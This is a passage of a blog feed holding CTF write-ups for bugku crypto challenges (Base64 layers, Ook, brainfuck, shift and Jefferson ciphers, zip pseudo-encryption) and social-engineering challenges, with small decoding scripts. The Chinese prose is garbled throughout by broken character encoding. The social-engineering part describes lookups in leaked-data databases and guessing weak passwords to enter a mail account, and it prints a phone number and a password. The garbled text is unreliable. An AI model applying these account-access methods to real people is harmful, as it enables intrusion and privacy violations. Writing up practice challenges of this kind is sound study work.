title="ä¸€æ®µBase64"></a>ä¸€æ®µBase64</h2><p>æŠŠæ–‡ä»¶ä¸‹è½½ä¸‹æ¥åï¼Œç¬¬ä¸€æ¬¡base64ä¹‹åå‘ç°æ˜¯8è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼Œç›´æ¥å¤åˆ¶ä¸‹æ¥åˆ©ç”¨pythonä¸­printå‡½æ•°çš„é»˜è®¤å±æ€§æ‰“å°ä¸€æ³¢ï¼Œå¾—åˆ°ä¸€ä¸ª16è¿›åˆ¶è½¬ä¹‰åºåˆ—ï¼Œå†ç”¨ä¸€æ¬¡printï¼Œä¸‹é¢æ˜¯æˆ‘è§£é¢˜æ—¶çš„ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">f = open(<span class="string">'C:/Users/Vinson Chan/Desktop/bs.txt'</span>,<span class="string">'r'</span>)</span><br><span class="line">str=f.read()</span><br><span class="line"></span><br><span class="line">f.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##print base64.b64decode(str)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">str = [<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">56</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">55</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">57</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">98</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">54</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">50</span>,<span class="number">51</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">49</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">48</span>,<span class="number">59</span>,<span class="number">38</span>,<span class="number">35</span>,<span class="number">120</span>,<span class="number">51</span>,<span class="number">50</span>]</span><br><span class="line">str2 = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str:</span><br><span class="line">str2 = str2+chr(i)</span><br><span class="line"></span><br><span class="line"><span class="comment">##print str2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##ä¸‹é¢æ­¥éª¤æ˜¯æ˜¯ç™¾åº¦çš„</span></span><br><span class="line"><span class="keyword">from</span> HTMLParser <span class="keyword">import</span> HTMLParser</span><br><span class="line">h = HTMLParser() </span><br><span class="line">s = h.unescape(h.unescape(str2))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s</span><br></pre></td></tr></table></figure><p>å¾—åˆ°ä¸€ä¸ªUnicodeç¼–ç ï¼Œæ”¾åœ¨ç«™é•¿å·¥å…·è·‘ä¸€ä¸‹ï¼Œå¾—åˆ°ä¸€ä¸²ASCIIç ï¼Œå†æ¥è½¬ä¹‰ä¸€ä¸‹ï¼Œå‘ç°æ˜¯htmlç¼–ç ï¼Œè§£ç ä¹‹åå‘ç°è¿˜æœ‰URLç¼–ç ï¼Œæ”¾åœ¨ç«™é•¿å·¥å…·ä¸Šè·‘ä¸€ä¸‹å°±è¡Œ<br><img src="https://s1.ax1x.com/2018/05/20/CgRjit.png" alt="CgRjit.png"></p><p>å…¶å®ç½‘ä¸Šè¿˜æœ‰ä¸€ä¸­ç®€å•çš„æ–¹æ³•ï¼Œç”¨ä¸€ä¸ªå«converterçš„å·¥å…·,æ–¹æ³•è‡ªå·±æ‰¾</p><h2 id=""><a href="#" class="headerlink" title=".!?"></a>.!?</h2><p>å¦ç±»çš„Ookç¼–ç <br>ç›´æ¥å»ç½‘ç«™è§£ç å³å¯</p><h2 id="-1"><a href="#-1" class="headerlink" title="+[]-"></a>+[]-</h2><p>å¦ç±»çš„brainfuckç¼–ç ï¼Œç›´æ¥å»ç½‘ç«™è§£ç å³å¯</p><h2 id="0x09-å¥‡æ€ªçš„å¯†ç "><a href="#0x09-å¥‡æ€ªçš„å¯†ç " class="headerlink" title="0x09 å¥‡æ€ªçš„å¯†ç "></a>0x09 å¥‡æ€ªçš„å¯†ç </h2><p>ç»™çš„æç¤ºä¸çŸ¥é“æ˜¯å•¥ï¼Œåªèƒ½ä¸€ä¸ªä¸ªè¯•ä¸€ä¸‹ï¼Œåˆæ¯«æ— å¤´ç»ªï¼Œå†çœ‹çœ‹é¢˜ç›®ï¼Œå‘ç°é‚£ä¸€æ®µå¯†æ–‡ç‰¹åˆ«åƒflagï¼Œäºæ˜¯å¯¹æ¯”gndkä¸flagçš„ASCIIç ï¼Œçªç„¶å‘ç°æ˜¯ä¾æ¬¡å‡å°‘çš„<br>äºæ˜¯åˆ†åˆ«ç”¨Cè¿˜æœ‰pythonå†™ä¸ªè„šæœ¬è§£å¯†ï¼Œå¾—åˆ°flag,ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; </span></span></span><br><span class="line">#<span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="keyword">char</span> a[]=<span class="string">"gndkâ‚¬rlqhmtkwwp&#125;z"</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i&lt;<span class="built_in">strlen</span>(a);i++)</span><br><span class="line">&#123;</span><br><span class="line">a[i]=a[i]-(i+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">cout</span>&lt;&lt;a&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">##encoding:utf-8</span></span><br><span class="line"></span><br><span class="line">str1 = <span class="string">'gndkâ‚¬rlqhmtkwwp&#125;z'</span></span><br><span class="line"><span class="comment">##print str1</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line">count = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line"> flag = flag+chr((ord(i)-count))</span><br><span class="line"> count=count+<span class="number">1</span></span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="æ‰˜é©¬æ–¯-æ°æ–é€Š"><a href="#æ‰˜é©¬æ–¯-æ°æ–é€Š" class="headerlink" title="æ‰˜é©¬æ–¯.æ°æ–é€Š"></a>æ‰˜é©¬æ–¯.æ°æ–é€Š</h2><p>è¿™æ˜¯ä¸ªæ°æ–é€Šå¯†ç ç›˜ï¼Œæ ¹æ®ç¬¬ä¸€ä¸ªå¯†é’¥è·Ÿå¯†æ–‡ï¼ŒæŠŠç¬¬äºŒè¡Œå•ç‹¬å–å‡ºæ¥ï¼Œç„¶åä»çš„åœ°æ–¹å¼€å§‹ï¼Œæ”¾åˆ°å†…å®¹æœ€å‰é¢<br>ä¾‹å¦‚<code>ï¼š&lt;KPBELNACZDTRXMJQOYHGVSFUWI &lt;   --&gt;   &lt;HGVSFUWIKPBELNACZDTRXMJQOY &lt;</code><br>æœ€åå¾—åˆ°ä¸‹é¢çš„å¯†æ–‡<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HGVSFUWIKPBELNACZDTRXMJQOY </span><br><span class="line">CPMNZQWXYIHFRLABEUOTSGJVDK </span><br><span class="line">BVIQHKYPNTCRMOSFEZWAXJGDLU </span><br><span class="line">TEQGYXPLOCKBDMAIZVRNSJUWFH </span><br><span class="line">SLOQXVETAMKGHIWPNYCJBFZDRU </span><br><span class="line">XQYIZMJWAORPLNDVHGFCUKTEBS </span><br><span class="line">WATDSRFHENYVUBMCOIKZGJXPLQ </span><br><span class="line">CEONJQGWTHSPYBXIZULVKMRAFD </span><br><span class="line">RJLXKISEFAPMYGHBQNOZUTWDCV </span><br><span class="line">QWXPHKZGJTDSENYVUBMLAOIRFC </span><br><span class="line">GOIKFHENYVUWABMCXPLTDSRJQZ </span><br><span class="line">LTDENQWAOXPYVUIKZGJBMCSRFH </span><br><span class="line">ENYSRUBMCQWVJXPLTDAOIKFZGH </span><br><span class="line">SWAYXPLVUBOIKZGJRFHENMCQTD</span><br></pre></td></tr></table></figure></p><p>ç„¶åä¸€åˆ—åˆ—å»å°è¯•ï¼Œå€’æ•°ç¬¬å…­åˆ—æ˜¯flag<br>æœ€åæäº¤çš„flagæ˜¯å°å†™</p><h2 id="0x11-ä¼ªåŠ å¯†"><a href="#0x11-ä¼ªåŠ å¯†" class="headerlink" title="0x11 ä¼ªåŠ å¯†"></a>0x11 ä¼ªåŠ å¯†</h2><p>ä¸Šæ¬¡çš„åšå®¢å†…å®¹å°±ä»‹ç»è¿‡ï¼Œä¸å¤šè¯´ï¼ŒæŠŠ09æ”¹ä¸º00å³å¯</p><h2 id="å‘Šè¯‰ä½ ä¸ªç§˜å¯†"><a href="#å‘Šè¯‰ä½ ä¸ªç§˜å¯†" class="headerlink" title="å‘Šè¯‰ä½ ä¸ªç§˜å¯†"></a>å‘Šè¯‰ä½ ä¸ªç§˜å¯†</h2><p>å‘ç°æ²¡æœ‰è¶…è¿‡Fçš„å­—æ¯ï¼Œè¾¹çŒœæµ‹æ˜¯16è¿›åˆ¶ï¼Œç„¶å16è¿›åˆ¶è½¬ç ï¼Œå‘ç°ä¸€ä¸²å…¨éƒ½æ˜¯æ•°å­—è·Ÿå­—æ¯çš„å­—ç¬¦ä¸²ï¼Œåº”è¯¥æ˜¯Base64<br><img src="https://s1.ax1x.com/2018/05/20/CgRvJP.png" alt="CgRvJP.png"><br>è§£ç åå‘ç°å‡ ç»„è‹±æ–‡ã€‚ã€‚ã€‚ã€‚<br><img src="https://s1.ax1x.com/2018/05/20/CgRxRf.png" alt="CgRxRf.png"><br>å‘ç°è·Ÿä¸Šæ¬¡æ ¡èµ›çš„é”®ç›˜é¢˜æ ¼å¼å·®ä¸å¤šï¼ŒçŒœæµ‹åº”æ˜¯é”®ç›˜å¯†ç ï¼Œè¿™é¢˜æ ¼å¼è¯•äº†å¥½ä¹…ï¼Œéƒ½å¿«æƒ³è¯´MMPäº†ï¼Œgoogleä¹‹åæ‰çŸ¥é“è¿™é¢˜æ ¼å¼æ˜¯flag:xxxxxxx(å…¨æ˜¯å¤§å†™)<br>å‘æƒ¨äº†!!</p><h2 id="æ¥è‡ªå®‡å®™çš„ä¿¡å·"><a href="#æ¥è‡ªå®‡å®™çš„ä¿¡å·" class="headerlink" title="æ¥è‡ªå®‡å®™çš„ä¿¡å·"></a>æ¥è‡ªå®‡å®™çš„ä¿¡å·</h2><p>ç™¾åº¦é“¶æ²³å­—æ¯ï¼Œå¯¹ç…§ç€ä¸‹å›¾å°±èƒ½æ‰¾åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2cNt.jpg" alt="Cg2cNt.jpg"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bugku Social write up</title>
      <link href="/bugku-social-wp.html"/>
      <url>/bugku-social-wp.html</url>
      <content type="html"><![CDATA[<h2 id="å¯†ç ï¼Ÿï¼Ÿï¼Ÿ"><a href="#å¯†ç ï¼Ÿï¼Ÿï¼Ÿ" class="headerlink" title="å¯†ç ï¼Ÿï¼Ÿï¼Ÿ"></a>å¯†ç ï¼Ÿï¼Ÿï¼Ÿ</h2><p>æ ¹æ®æç¤ºç›´æ¥çŒœæµ‹å¯†ç ä¸ºzs19970315ï¼Œå°è¯•æˆåŠŸ<br><img src="https://s1.ax1x.com/2018/05/20/CggIFx.png" alt="CggIFx.png"><br><a id="more"></a></p><h2 id="åŸŸåè§£æï¼Ÿ"><a href="#åŸŸåè§£æï¼Ÿ" class="headerlink" title="åŸŸåè§£æï¼Ÿ"></a>åŸŸåè§£æï¼Ÿ</h2><p>ç›´æ¥æ”¹æœ¬åœ°çš„hostæ–‡ä»¶ï¼Œwin10çš„è¯åœ¨â€™C:\Windows\System32\drivers\etcâ€™ç›®å½•ä¸‹ï¼Œè®°å¾—ç”¨ç®¡ç†æƒé™æ‰“å¼€<br>é‡Œé¢æ·»åŠ ä¸€è¡Œ120.24.86.145  flag.bugku.com<br>ç„¶åæµè§ˆå™¨æ‰“å¼€flag.bugku.comè·å¾—key<br><img src="https://s1.ax1x.com/2018/05/20/CggTfK.png" alt="CggTfK.png"></p><h2 id="ä¿¡æ¯æŸ¥æ‰¾ï¼Ÿï¼Ÿï¼Ÿ"><a href="#ä¿¡æ¯æŸ¥æ‰¾ï¼Ÿï¼Ÿï¼Ÿ" class="headerlink" title="ä¿¡æ¯æŸ¥æ‰¾ï¼Ÿï¼Ÿï¼Ÿ"></a>ä¿¡æ¯æŸ¥æ‰¾ï¼Ÿï¼Ÿï¼Ÿ</h2><p>ç™¾åº¦æ‰¾åˆ°ç½‘é¡µï¼š<code>http://www.xiukee.com/show_356966.html</code><br>æœ‰ä¸ªæç¤ºæ˜¯flagæ˜¯ç¾¤å·ç ï¼Œé‚£æˆ‘å°±è¯•ä¸€ä¸‹ç¾¤å·ç è¯•å°±è¡Œäº†ï¼ŒæˆåŠŸè¿‡å…³</p><h2 id="ç®€å•ä¸ªäººä¿¡æ¯æ”¶é›†"><a href="#ç®€å•ä¸ªäººä¿¡æ¯æ”¶é›†" class="headerlink" title="ç®€å•ä¸ªäººä¿¡æ¯æ”¶é›†"></a>ç®€å•ä¸ªäººä¿¡æ¯æ”¶é›†</h2><p>æŠŠå‹ç¼©åŒ…ä¸‹è½½ä¸‹æ¥ä¹‹åå‘ç°æ˜¯ä¼ªåŠ å¯†ï¼Œæ‹–è¿›HXDä¸­æŸ¥æ‰¾16è¿›åˆ¶ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cggq6e.png" alt="Cggq6e.png"><br>æŠŠå›¾ä¸­çº¢è‰²çš„09æ”¹ä¸º00ï¼Œå› ä¸ºåŸºæ•°æ˜¯ä¼ªåŠ å¯†ã€‚<br>å¯å‚è€ƒï¼š<a href="http://0verwatch.top/2018/02/08/zipfalse/">http://0verwatch.top/2018/02/08/zipfalse/</a><br>æ‰“å¼€å‹ç¼©åŒ…å‘ç°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå«æˆ‘å¯»æ‰¾ä¸‹å›¾çš„ä¿¡æ¯ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cg2lX4.png" alt="Cg2lX4.png"><br>ç¿»å¢™æ‰¾ä¸ªç¤¾å·¥åº“æŸ¥ä¸€æŸ¥ï¼Œä½†å¾ˆå¤šç¤¾å·¥åº“éƒ½æŒ‚æ‰äº†ï¼Œæˆ‘ç›´æ¥çœ‹çš„åˆ«äººçš„wpå¾—åˆ°çš„ç»“æœã€‚ã€‚ã€‚<br>æ‰‹æœºå·ç æ˜¯15206164164</p><h2 id="å…¥é—¨é¢˜ç›®ï¼Œç¤¾å·¥å¸ï¼Ÿ"><a href="#å…¥é—¨é¢˜ç›®ï¼Œç¤¾å·¥å¸ï¼Ÿ" class="headerlink" title="å…¥é—¨é¢˜ç›®ï¼Œç¤¾å·¥å¸ï¼Ÿ"></a>å…¥é—¨é¢˜ç›®ï¼Œç¤¾å·¥å¸ï¼Ÿ</h2><p>ç»™äº†ä¸ªåå­—ç»™æˆ‘ï¼Œä¸Šè°·æ­Œä¸€å¥æœç´¢å‘½ä»¤ï¼šintitle:å­¤é•¿ç¦»ï¼Œç¬¬ä¸€ä¸ªå°±æ˜¯å®ƒçš„è´´å§<br><img src="https://s1.ax1x.com/2018/05/20/Cg23nJ.png" alt="Cg23nJ.png"><br>é‡Œé¢æœ‰ä¸ª163çš„é‚®ç®±ï¼Œåˆæ ¹æ®æç¤ºæ˜¯å¼±å£ä»¤ï¼Œç™¾åº¦å¼±å£ä»¤ï¼Œä¸€ä¸ªä¸ªè¯•ï¼Œå› ä¸º163é‚®ç®±æœ‰éªŒè¯ç å°±ä¸èƒ½ç”¨bpå»çˆ†ç ´ï¼Œè¿˜æ˜¯æ‰‹åŠ¨è¯•å§ï¼Œæˆ‘è¯•åˆ°ç¬¬äºŒä¸ªå°±æ˜¯äº†ã€‚<br>åœ¨é‡Œé¢æ‰¾åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2Nh6.png" alt="Cg2Nh6.png"></p><h2 id="ç®€å•çš„ç¤¾å·¥å°è¯•"><a href="#ç®€å•çš„ç¤¾å·¥å°è¯•" class="headerlink" title="ç®€å•çš„ç¤¾å·¥å°è¯•"></a>ç®€å•çš„ç¤¾å·¥å°è¯•</h2><p>æ‹¿åˆ°ä¸€ä¸ªå›¾ç‰‡é‚®ä»¶å•¥ä¸œè¥¿éƒ½æ²¡æœ‰ï¼Œåªèƒ½å»binwalkä¸€ä¸‹äº†ï¼Œå‘ç°é‡Œé¢æœ‰ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€ä¸€çœ‹å•¥éƒ½æ²¡æœ‰<br>åˆçœ‹äº†çœ‹é¢˜ç›®ï¼Œè¯´æ˜¯å¤´åƒï¼Œè¿™æ—¶å€™æ„è¯†åˆ°è‡ªå·±æƒ³é”™æ–¹å‘äº†ï¼Œä¸åº”è¯¥å¾€miscæ–¹å‘æƒ³çš„<br>äºæ˜¯ä¹å°±ç”¨ç™¾åº¦è¯†å›¾çœ‹ä¸€çœ‹ã€‚ã€‚åˆæ˜¯ä»€ä¹ˆéƒ½æ²¡æœ‰ã€‚ã€‚ã€‚ã€‚<br><a href="https://imgchr.com/i/Cg2a9K" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2018/05/20/Cg2a9K.md.png" alt="Cg2a9K.md.png"></a><br>å†æ¥è°·æ­Œè¯†å›¾ï¼Œè¿™æ¬¡æ‰¾åˆ°ä¸€ä¸ªgithubä¸Šçš„bugkuï¼Œç¿»æ¥ç¿»å»è¿˜æ˜¯æ²¡æ‰¾åˆ°flag<br>æœ€åå‘ç°ä¸€ä¸ªå¾®åšé“¾æ¥ï¼Œ<br><img src="https://s1.ax1x.com/2018/05/20/Cg2d1O.png" alt="Cg2d1O.png"><br>ç‚¹è¿›å»å‘ç°ä¸€ä¸ªé†’ç›®çš„å›¾ç‰‡<br><img src="https://s1.ax1x.com/2018/05/20/Cg2wcD.png" alt="Cg2wcD.png"><br>å†æ‰“å¼€ä¸€çœ‹ï¼Œbingoæ‰¾åˆ°flag<br><img src="https://s1.ax1x.com/2018/05/20/Cg2DnH.png" alt="Cg2DnH.png"></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Social </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>zipä¼ªåŠ å¯†[è½¬è½½]</title>
      <link href="/zipfalse.html"/>
      <url>/zipfalse.html</url>
